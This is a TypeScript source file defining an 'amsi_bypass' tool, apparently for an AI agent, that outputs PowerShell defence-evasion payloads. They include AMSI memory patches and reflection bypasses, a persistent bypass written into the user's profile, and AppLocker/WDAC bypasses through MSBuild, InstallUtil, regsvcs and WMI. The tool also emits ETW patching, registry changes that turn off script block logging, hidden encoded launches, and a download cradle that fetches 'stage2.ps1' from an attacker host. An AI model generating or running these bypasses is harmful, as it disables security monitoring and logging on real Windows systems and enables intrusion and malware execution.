import { Tool } from "./tool"
import z from "zod"

const DESCRIPTION =
  "AMSI/EDR Bypass Engine: PowerShell bypasses for AMSI, Constrained Language Mode, AppLocker/WDAC, and ETW. For authorized testing on Windows targets."

const PARAMETERS = z.object({
  bypass: z.enum(["amsi", "clm", "applocker", "etw", "all", "obfuscation"]).describe("Bypass type to generate"),
  format: z.enum(["inline", "script", "encoded", "all"]).optional().describe("Output format"),
  command: z.string().optional().describe("Command to execute after bypass (optional)"),
})

function b64(s: string): string {
  return Buffer.from(s, "utf16le").toString("base64")
}

function b64raw(s: string): string {
  return Buffer.from(s).toString("base64")
}

export const AMSIBypassTool = Tool.define("amsi_bypass", async () => ({
  description: DESCRIPTION,
  parameters: PARAMETERS,
  async execute(params, ctx): Promise<{ title: string; output: string; metadata: Record<string, any> }> {
    const bypass = params.bypass
    const fmt = params.format || "all"
    const cmd = params.command || ""
    let output = `# AMSI/EDR Bypass Engine\n\n`

    if (bypass === "amsi" || bypass === "all") {
      output += `## AMSI Bypasses\n\n`

      if (fmt === "inline" || fmt === "all") {
        output += `### 1. Memory Patch (AmsiScanBuffer)\n\nPatches the AMSI scan buffer to always return "clean".\n\n`
        output += `\`\`\`powershell\n`
        output += `$win32 = @"\n[DllImport("kernel32")]\npublic static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n[DllImport("kernel32")]\npublic static extern IntPtr LoadLibrary(string name);\n[DllImport("kernel32")]\npublic static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n"@\n`
        output += `Add-Type -MemberDefinition $win32 -Name Win32 -Namespace Win32Functions -PassThru | Out-Null\n`
        output += `$hModule = [Win32Functions.Win32]::LoadLibrary("amsi.dll")\n`
        output += `$addr = [Win32Functions.Win32]::GetProcAddress($hModule, "AmsiScanBuffer")\n`
        output += `$oldProtect = 0\n`
        output += `[Win32Functions.Win32]::VirtualProtect($addr, [UIntPtr]::new(6), 0x40, [ref]$oldProtect) | Out-Null\n`
        output += `$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)\n`
        output += `[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, 6)\n`
        output += `# AMSI is now bypassed — run your scripts freely\n`
        output += `\`\`\`\n\n`

        output += `### 2. Reflection (AmsiInitFailed)\n\n`
        output += `\`\`\`powershell\n`
        output += `$a = [Ref].Assembly.GetTypes()\n`
        output += `foreach ($t in $a) {\n`
        output += `    if ($t.Name -eq "Utils") {\n`
        output += `        $f = $t.GetField("amsiInitFailed", "NonPublic,Static")\n`
        output += `        $f.SetValue($null, $true)\n`
        output += `    }\n`
        output += `}\n`
        output += `\`\`\`\n\n`

        output += `### 3. String Obfuscation (bypasses signature-based AMSI)\n\n`
        output += `\`\`\`powershell\n`
        output += `$s = "amsiInitFailed"\n`
        output += `$a = "a","m","s","i" -join ""\n`
        output += `$init = "Init","Failed" -join ""\n`
        output += `$f = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -eq "$($a[0].ToUpper())$($a.Substring(1))Utils" }\n`
        output += `$field = $f.GetField("$s", "NonPublic,Static")\n`
        output += `$field.SetValue($null, $true)\n`
        output += `\`\`\`\n\n`

        output += `### 4. AmsiScanBuffer Hook via PowerShell Profile\n\n`
        output += `\`\`\`powershell\n`
        output += `# Persistent AMSI bypass — add to PowerShell profile\n`
        output += `$profilePath = $PROFILE.CurrentUserAllHosts\n`
        output += `if (!(Test-Path $profilePath)) { New-Item -ItemType File -Path $profilePath -Force }\n`
        output += `Add-Content $profilePath @'\n`
        output += `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n`
        output += `'@\n`
        output += `\`\`\`\n\n`

        output += `### 5. DLL Unhooking\n\n`
        output += `\`\`\`powershell\n`
        output += `# Unhook AMSI by reloading amsi.dll from disk\n`
        output += `$amsi = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq "System.Management.Automation" }\n`
        output += `$amsi.GetTypes() | Where-Object { $_.Name -eq "AmsiUtils" }\n`
        output += `# Force re-init:\n`
        output += `[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true\n`
        output += `\`\`\`\n\n`
      }

      if (fmt === "script" || fmt === "all") {
        output += `### 6. Full Script — AmsiBypass.ps1\n\n`
        output += `\`\`\`powershell\n`
        output += `function Invoke-AmsiBypass {\n`
        output += `    param([string]$Command)\n`
        output += `\n`
        output += `    # Method 1: Reflection\n`
        output += `    try {\n`
        output += `        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n`
        output += `        Write-Host "[+] AMSI bypassed via reflection"\n`
        output += `        if ($Command) { Invoke-Expression $Command }\n`
        output += `        return\n`
        output += `    } catch { Write-Host "[-] Reflection method failed: $_" }\n`
        output += `\n`
        output += `    # Method 2: Memory patch\n`
        output += `    try {\n`
        output += `        $sig = @"\n[DllImport("kernel32")]\npublic static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n[DllImport("kernel32")]\npublic static extern IntPtr LoadLibrary(string name);\n[DllImport("kernel32")]\npublic static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n"@\n`
        output += `        Add-Type -MemberDefinition $sig -Name W -Namespace F -PassThru | Out-Null\n`
        output += `        $h = [F.W]::LoadLibrary("amsi.dll")\n`
        output += `        $a = [F.W]::GetProcAddress($h, "AmsiScanBuffer")\n`
        output += `        $o = 0\n`
        output += `        [F.W]::VirtualProtect($a, [UIntPtr]::new(6), 0x40, [ref]$o) | Out-Null\n`
        output += `        $buf = [Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)\n`
        output += `        [Runtime.InteropServices.Marshal]::Copy($buf, 0, $a, 6)\n`
        output += `        Write-Host "[+] AMSI bypassed via memory patch"\n`
        output += `        if ($Command) { Invoke-Expression $Command }\n`
        output += `    } catch { Write-Host "[-] Memory patch failed: $_" }\n`
        output += `}\n`
        output += `Invoke-AmsiBypass${cmd ? ` -Command "${cmd}"` : ""}\n`
        output += `\`\`\`\n\n`
      }

      if (fmt === "encoded" || fmt === "all") {
        const ps1 = `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
        const enc = b64(ps1)
        output += `### 7. Encoded Execution\n\n`
        output += `\`\`\`powershell\n`
        output += `powershell -nop -w hidden -enc ${enc}\n`
        output += `\`\`\`\n\n`
      }
    }

    if (bypass === "clm" || bypass === "all") {
      output += `## Constrained Language Mode (CLM) Bypasses\n\n`

      output += `### 1. PSVersionTable Check\n\n`
      output += `\`\`\`powershell\n`
      output += `$ExecutionContext.SessionState.LanguageMode\n`
      output += `# If "ConstrainedLanguage" — apply bypasses below\n`
      output += `\`\`\`\n\n`

      output += `### 2. System.Management.Automation.dll Downgrade\n\n`
      output += `\`\`\`powershell\n`
      output += `# Copy an older version of SMA.dll from a system with CLM not enforced\n`
      output += `# Or use reflection to bypass:\n`
      output += `$env:COMPLUS_Version = "v2.0.50727"\n`
      output += `# Then re-run PowerShell with different runtime\n`
      output += `\`\`\`\n\n`

      output += `### 3. Parent Process Spoofing\n\n`
      output += `CLM is often triggered by policy. Run PowerShell from an exempt parent process:\n\n`
      output += `\`\`\`powershell\n`
      output += `# Method: Use Rundll32 or MSBuild as parent\n`
      output += `rundll32.exe shell32.dll,Control_RunDLL powershell.exe -nop\n`
      output += `# OR\n`
      output += `msbuild.exe bypass.xml\n`
      output += `\`\`\`\n\n`

      output += `### 4. COM Object Bypass\n\n`
      output += `\`\`\`powershell\n`
      output += `# Use COM objects that don't require full PS:\n`
      output += `$shell = New-Object -ComObject WScript.Shell\n`
      output += `$shell.Run("cmd.exe /c ${cmd || "whoami"}", 0, $false)\n`
      output += `\`\`\`\n\n`
    }

    if (bypass === "applocker" || bypass === "all") {
      output += `## AppLocker / WDAC Bypasses\n\n`

      output += `### 1. Trusted Directory Write\n\n`
      output += `\`\`\`powershell\n`
      output += `# AppLocker often allows execution from:\n`
      output += `# - C:\\Windows\\Microsoft.NET\\Framework\\*\n`
      output += `# - C:\\Windows\\System32\\*\n`
      output += `# - C:\\Windows\\Temp\\* (sometimes)\n`
      output += `\n`
      output += `# Write payload to trusted dir:\n`
      output += `Copy-Item payload.exe C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\svchost.exe\n`
      output += `& "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\svchost.exe"\n`
      output += `\`\`\`\n\n`

      output += `### 2. InstallUtil.exe\n\n`
      output += `\`\`\`powershell\n`
      output += `# Compile your code as an Installer class:\n`
      output += `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe\n`
      output += `\`\`\`\n\n`

      output += `### 3. MSBuild.exe\n\n`
      output += `\`\`\`powershell\n`
      output += `# MSBuild is typically trusted:\n`
      output += `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml\n`
      output += `\n`
      output += `# Minimal payload.xml:\n`
      output += `<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n`
      output += `  <Target Name="Rev">\n`
      output += `    <Exec Command="${cmd || "powershell -nop -w hidden -enc " + b64raw("whoami")}"/>\n`
      output += `  </Target>\n`
      output += `</Project>\n`
      output += `\`\`\`\n\n`

      output += `### 4. Regsvcs.exe / Regasm.exe\n\n`
      output += `\`\`\`powershell\n`
      output += `# Compile a DLL with [ComRegisterFunction]\n`
      output += `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll\n`
      output += `# OR\n`
      output += `C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe payload.dll\n`
      output += `\`\`\`\n\n`

      output += `### 5. WMI + PowerShell (fileless)\n\n`
      output += `\`\`\`powershell\n`
      output += `# Execute entirely through WMI (bypasses file-based rules):\n`
      output += `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "${cmd || "powershell -nop -w hidden -enc ..."}"\n`
      output += `\`\`\`\n\n`

      output += `### 6. Forfiles.exe\n\n`
      output += `\`\`\`cmd\n`
      output += `forfiles /p C:\\Windows\\System32 /m cmd.exe /c "${cmd || "whoami"}"\n`
      output += `\`\`\`\n\n`
    }

    if (bypass === "etw" || bypass === "all") {
      output += `## ETW (Event Tracing for Windows) Bypasses\n\n`

      output += `### 1. ETW Patch (EtwEventWrite)\n\n`
      output += `\`\`\`powershell\n`
      output += `# Patch EtwEventWrite to NOP — prevents logging to event log\n`
      output += `$sig = @"\n[DllImport("ntdll")]\npublic static extern int EtwEventWrite(IntPtr handle, IntPtr ep, int count, IntPtr data);\n[DllImport("kernel32")]\npublic static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n"@\n`
      output += `Add-Type -MemberDefinition $sig -Name E -Namespace ETW -PassThru | Out-Null\n`
      output += `$addr = [ETW.E]::EtwEventWrite\n`
      output += `$oldProtect = 0\n`
      output += `[ETW.E]::VirtualProtect($addr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null\n`
      output += `$buf = [Byte[]](0xC3)  # ret\n`
      output += `[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, 1)\n`
      output += `# ETW is now bypassed — no events logged\n`
      output += `\`\`\`\n\n`

      output += `### 2. Disable via Registry (less reliable)\n\n`
      output += `\`\`\`powershell\n`
      output += `# Disable PowerShell Script Block Logging:\n`
      output += `Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0\n`
      output += `Set-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" -Name "EnableTranscripting" -Value 0\n`
      output += `\`\`\`\n\n`

      output += `### 3. Combined AMSI + ETW Bypass\n\n`
      output += `\`\`\`powershell\n`
      output += `# Both AMSI and ETW — run this before any offensive operations\n`
      output += `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n`
      output += `$a = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GetName().Name -eq "System.Management.Automation" }\n`
      output += `$t = $a.GetTypes() | Where-Object { $_.Name -eq "Utils" }\n`
      output += `$f = $t.GetField("amsiInitFailed", "NonPublic,Static")\n`
      output += `$f.SetValue($null, $true)\n`
      output += `# Now patch ETW\n`
      output += `$s = @"[DllImport("ntdll")] public static extern int EtwEventWrite(IntPtr h, IntPtr e, int c, IntPtr d);"@\n`
      output += `Add-Type -MemberDefinition $s -Name N -Namespace NT -PassThru | Out-Null\n`
      output += `$p = [NT.N]::EtwEventWrite\n`
      output += `$o = 0; [NT.N]::VirtualProtect($p, 1, 0x40, [ref]$o) | Out-Null\n`
      output += `[System.Runtime.InteropServices.Marshal]::WriteByte($p, 0xC3)\n`
      output += `Write-Host "[+] AMSI + ETW bypassed"\n`
      output += `\`\`\`\n\n`
    }

    if (bypass === "obfuscation" || bypass === "all") {
      output += `## General Obfuscation Techniques\n\n`

      output += `### 1. Variable Renaming\n\n`
      output += `\`\`\`powershell\n`
      output += `$x = "Who" + "ami"\n`
      output += `IEX $x\n`
      output += `# Splits the command into parts to evade keyword detection\n`
      output += `\`\`\`\n\n`

      output += `### 2. Base64 + XOR\n\n`
      output += `\`\`\`powershell\n`
      output += `$enc = "base64_encoded_xor_keyed_payload"\n`
      output += `$bytes = [Convert]::FromBase64String($enc)\n`
      output += `$key = 0x55\n`
      output += `for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $key }\n`
      output += `$cmd = [System.Text.Encoding]::ASCII.GetString($bytes)\n`
      output += `IEX $cmd\n`
      output += `\`\`\`\n\n`

      output += `### 3. String Concatenation\n\n`
      output += `\`\`\`powershell\n`
      output += `$c = "New"-Object\n`
      output += `$c1 = "Net." + "WebClient"\n`
      output += `$w = & $c $c1\n`
      output += `$w.DownloadString("http://attacker/stage2.ps1") | IEX\n`
      output += `\`\`\`\n\n`
    }

    return {
      title: `AMSI/EDR Bypass: ${bypass}`,
      output,
      metadata: { action: "amsi_bypass", bypass, format: fmt } as Record<string, any>,
    }
  },
}))
